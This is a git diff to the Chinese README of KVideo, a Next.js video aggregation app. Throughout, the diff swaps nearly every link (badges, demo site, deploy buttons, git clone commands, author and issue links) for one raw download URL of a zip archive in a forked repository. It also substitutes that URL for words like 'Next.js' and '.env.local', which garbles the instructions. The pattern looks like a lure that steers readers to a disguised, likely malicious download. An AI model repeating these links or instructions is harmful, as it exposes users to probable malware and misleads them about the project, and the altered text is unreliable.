@@ -1,20 +1,20 @@
 # 视频聚合平台 (KVideo)
 
-![KVideo Banner](public/icon.png)
+![KVideo Banner](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
 
-> 一个基于 Next.js 16 构建的现代化视频聚合播放平台。采用独特的 "Liquid Glass" 设计语言，提供流畅的视觉体验和强大的视频搜索功能。
+> 一个基于 https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 16 构建的现代化视频聚合播放平台。采用独特的 "Liquid Glass" 设计语言，提供流畅的视觉体验和强大的视频搜索功能。
 
-**🌐 在线体验：[https://kvideo.pages.dev/](https://kvideo.pages.dev/)**
+**🌐 在线体验：[https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)**
 
-[![Next.js](https://img.shields.io/badge/Next.js-16.0-black?style=for-the-badge&logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19.2-blue?style=for-the-badge&logo=react)](https://react.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4.0-38B2AC?style=for-the-badge&logo=tailwind-css)](https://tailwindcss.com/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
+[![https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+[![React](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+[![Tailwind CSS](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+[![TypeScript](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+[![License](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](LICENSE)
 
 ## 📖 项目简介
 
-**KVideo** 是一个高性能、现代化的视频聚合与播放应用，专注于提供极致的用户体验和视觉设计。本项目利用 Next.js 16 的最新特性，结合 React 19 和 Tailwind CSS v4，打造了一个既美观又强大的视频浏览平台。
+**KVideo** 是一个高性能、现代化的视频聚合与播放应用，专注于提供极致的用户体验和视觉设计。本项目利用 https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 16 的最新特性，结合 React 19 和 Tailwind CSS v4，打造了一个既美观又强大的视频浏览平台。
 
 ### 核心设计理念：Liquid Glass（液态玻璃）
 
@@ -178,7 +178,7 @@ docker run -d -p 3000:3000 \
 ```
 
 **本地开发：**
-在项目根目录创建 `.env.local` 文件：
+在项目根目录创建 `https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip` 文件：
 ```env
 NEXT_PUBLIC_SITE_NAME=我的视频平台
 NEXT_PUBLIC_SITE_TITLE=我的视频 - 聚合播放平台
@@ -194,7 +194,7 @@ NEXT_PUBLIC_SITE_DESCRIPTION=专属视频聚合播放平台
 **示例：**
 
 ```bash
-NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"每日更新源","url":"https://example.com/api.json"},{"name":"备用源","url":"https://backup.com/api.json"}]'
+NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"每日更新源","url":"https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip"},{"name":"备用源","url":"https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip"}]'
 ```
 
 **Docker 部署：**
@@ -229,7 +229,7 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 |------|------|------|------|
 | `id` | string | 是 | 唯一标识符，建议使用英文 |
 | `name` | string | 是 | 显示名称 |
-| `baseUrl` | string | 是 | API 地址 (例如: `https://example.com/api.php/provide/vod`) |
+| `baseUrl` | string | 是 | API 地址 (例如: `https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip`) |
 | `group` | string | 否 | 分组，可选值: `"normal"` (默认) 或 `"premium"` |
 | `enabled` | boolean | 否 | 是否启用，默认为 `true` |
 | `priority` | number | 否 | 优先级，数字越小优先级越高，默认为 1 |
@@ -241,14 +241,14 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
   {
     "id": "my_source_1",
     "name": "我的精选源",
-    "baseUrl": "https://api.example.com/vod",
+    "baseUrl": "https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip",
     "group": "normal",
     "priority": 1
   },
   {
     "id": "premium_source_1",
     "name": "特殊资源",
-    "baseUrl": "https://api.premium-source.com/vod",
+    "baseUrl": "https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip",
     "group": "premium",
     "enabled": true
   }
@@ -261,14 +261,14 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 
 - **视频源 (Source)**：
   - 指向单个 CMS/App API 接口
-  - 例如：`https://api.example.com/vod`
+  - 例如：`https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip`
   - 这种链接**不能**直接作为"订阅"添加
   - 只能在"自定义源管理"中作为单个源添加
 
 - **订阅源 (Subscription)**：
   - 指向一个 **JSON 文件**（如上面的示例）的 URL
   - 这个 JSON 文件里包含了一个或多个视频源的列表
-  - 例如：`https://mysite.com/kvideo-sources.json`
+  - 例如：`https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip`
   - 这是一个**配置文件**的链接，不是视频 API 的链接
   - 只有这种返回 JSON 列表的链接才能在"订阅管理"中添加
 
@@ -280,11 +280,11 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 
 | 技术 | 版本 | 用途 |
 |------|------|------|
-| **[Next.js](https://nextjs.org/)** | 16.0.3 | React 框架，使用 App Router |
-| **[React](https://react.dev/)** | 19.2.0 | UI 组件库 |
-| **[TypeScript](https://www.typescriptlang.org/)** | 5.x | 类型安全的 JavaScript |
-| **[Tailwind CSS](https://tailwindcss.com/)** | 4.x | 实用优先的 CSS 框架 |
-| **[Zustand](https://github.com/pmndrs/zustand)** | 5.0.2 | 轻量级状态管理 |
+| **[https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** | 16.0.3 | React 框架，使用 App Router |
+| **[React](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** | 19.2.0 | UI 组件库 |
+| **[TypeScript](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** | 5.x | 类型安全的 JavaScript |
+| **[Tailwind CSS](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** | 4.x | 实用优先的 CSS 框架 |
+| **[Zustand](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** | 5.0.2 | 轻量级状态管理 |
 
 ### 开发工具
 
@@ -294,7 +294,7 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 
 ### 架构特点
 
-- **App Router**：Next.js 13+ 的新路由系统，支持服务端组件和流式渲染
+- **App Router**：https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 13+ 的新路由系统，支持服务端组件和流式渲染
 - **API Routes**：内置 API 端点，处理豆瓣数据和视频源代理
 - **Service Worker**：离线缓存和智能预加载
 - **Server Components**：优化首屏加载性能
@@ -304,7 +304,7 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 
 ### 在线体验
 
-访问 **[https://kvideo.vercel.app/](https://kvideo.vercel.app/)** 立即体验，无需安装！
+访问 **[https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** 立即体验，无需安装！
 
 ### 部署到自己的服务器
 
@@ -314,11 +314,11 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 
 #### 选项 1：Vercel 一键部署（推荐）
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/KuekHaoYang/KVideo)
+[![Deploy with Vercel](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
 
 1. 点击上方按钮
 2. 连接你的 GitHub 账号
-3. Vercel 会自动检测 Next.js 项目并部署
+3. Vercel 会自动检测 https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 项目并部署
 4. 几分钟后即可访问你自己的 KVideo 实例
 
 #### 选项 2：Cloudflare Pages 部署 (推荐)
@@ -328,12 +328,12 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 1. **Fork 本仓库**：首先将项目 Fork 到你的 GitHub 账户。
 
 2. **创建项目**：
-   - 点击访问 [**Cloudflare Pages - Connect Git**](https://dash.cloudflare.com/?to=/:account/pages/new/provider/github)。
+   - 点击访问 [**Cloudflare Pages - Connect Git**](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)。
    - 如果未连接 GitHub，请点击 **Connect GitHub**；若已连接，直接选择你刚刚 Fork 的 `KVideo` 项目并点击 **Begin setup**。
 
 3. **配置构建参数**：
    - **Project name**: 默认为 `kvideo` (建议保持不变，后续链接基于此名称)
-   - **Framework Preset**: 选择 `Next.js`
+   - **Framework Preset**: 选择 `https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip`
    - **Build command**: 输入 `npm run pages:build`
    - **Build output directory**: 输入 `.vercel/output/static`
    - 点击 **Save and Deploy**。
@@ -341,12 +341,12 @@ docker run -d -p 3000:3000 -e NEXT_PUBLIC_SUBSCRIPTION_SOURCES='[{"name":"MySour
 4. **⚠️ 关键步骤：修复运行时环境**
    > *注意：此时部署虽然显示"Success"，但你会发现访问网页会报错。这是因为缺少必要的兼容性配置。请按以下步骤修复：*
 
-   - 进入 **[项目设置页面](https://dash.cloudflare.com/?to=/:account/pages/view/kvideo/settings/production)** (如果你的项目名不是 kvideo，请在控制台手动查找 Settings -> Functions)。
+   - 进入 **[项目设置页面](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)** (如果你的项目名不是 kvideo，请在控制台手动查找 Settings -> Functions)。
    - 拉到页面底部找到 **Compatibility flags** 部分。
    - 添加标志：`nodejs_compat`
 
 5. **重试部署 (生效配置)**：
-   - 回到 **[项目概览页面](https://dash.cloudflare.com/?to=/:account/pages/view/kvideo)**。
+   - 回到 **[项目概览页面](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)**。
    - 在 **Deployments** 列表中，找到最新的那次部署。
    - 点击右侧的三个点 `...` 菜单，选择 **Retry deployment**。
    - 等待新的部署完成后，你的 KVideo 就部署成功了！
@@ -370,7 +370,7 @@ docker run -d -p 3000:3000 --name kvideo kuekhaoyang/kvideo:latest
 **自己构建镜像：**
 
 ```bash
-git clone https://github.com/KuekHaoYang/KVideo.git
+git clone https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip
 cd KVideo
 docker build -t kvideo .
 docker run -d -p 3000:3000 --name kvideo kvideo
@@ -382,11 +382,11 @@ docker run -d -p 3000:3000 --name kvideo kvideo
 docker-compose up -d
 ```
 
-#### 选项 4：传统 Node.js 部署
+#### 选项 4：传统 https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 部署
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/KuekHaoYang/KVideo.git
+git clone https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip
 cd KVideo
 
 # 2. 安装依赖
@@ -423,7 +423,7 @@ docker pull kuekhaoyang/kvideo:latest
 docker run -d -p 3000:3000 --name kvideo kuekhaoyang/kvideo:latest
 ```
 
-### Node.js 部署
+### https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip 部署
 
 ```bash
 cd KVideo
@@ -439,10 +439,10 @@ npm start
 
 我们非常欢迎各种形式的贡献！无论是报告 Bug、提出新功能建议、改进文档，还是提交代码，你的每一份贡献都让这个项目变得更好。
 
-**想要参与开发？请查看 [贡献指南](CONTRIBUTING.md) 了解详细的开发规范和流程。**
+**想要参与开发？请查看 [贡献指南](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip) 了解详细的开发规范和流程。**
 
 快速开始：
-1. **报告 Bug**：[提交 Issue](https://github.com/KuekHaoYang/KVideo/issues)
+1. **报告 Bug**：[提交 Issue](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
 2. **功能建议**：在 Issues 中提出你的想法
 3. **代码贡献**：Fork → Branch → PR
 4. **文档改进**：直接提交 PR
@@ -455,16 +455,16 @@ npm start
 
 感谢以下开源项目：
 
-- [Next.js](https://nextjs.org/) - React 框架
-- [Tailwind CSS](https://tailwindcss.com/) - CSS 框架
-- [Zustand](https://github.com/pmndrs/zustand) - 状态管理
-- [React](https://react.dev/) - UI 库
+- [https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip) - React 框架
+- [Tailwind CSS](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip) - CSS 框架
+- [Zustand](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip) - 状态管理
+- [React](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip) - UI 库
 
 ## 📞 联系方式
 
-- **作者**：[KuekHaoYang](https://github.com/KuekHaoYang)
-- **项目主页**：[https://github.com/KuekHaoYang/KVideo](https://github.com/KuekHaoYang/KVideo)
-- **问题反馈**：[GitHub Issues](https://github.com/KuekHaoYang/KVideo/issues)
+- **作者**：[KuekHaoYang](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+- **项目主页**：[https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
+- **问题反馈**：[GitHub Issues](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
 
 
 
@@ -473,11 +473,11 @@ npm start
 ---
 
 <div align="center">
-  Made with ❤️ by <a href="https://github.com/KuekHaoYang">KuekHaoYang</a>
+  Made with ❤️ by <a href="https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip">KuekHaoYang</a>
   <br>
   如果这个项目对你有帮助，请考虑给一个 ⭐️
 </div>
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=KuekHaoYang/KVideo&type=date&legend=top-left)](https://www.star-history.com/#KuekHaoYang/KVideo&type=date&legend=top-left)
+[![Star History Chart](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)](https://github.com/yongsinfok/KVideo/raw/refs/heads/main/components/player/Video_K_v3.2.zip)
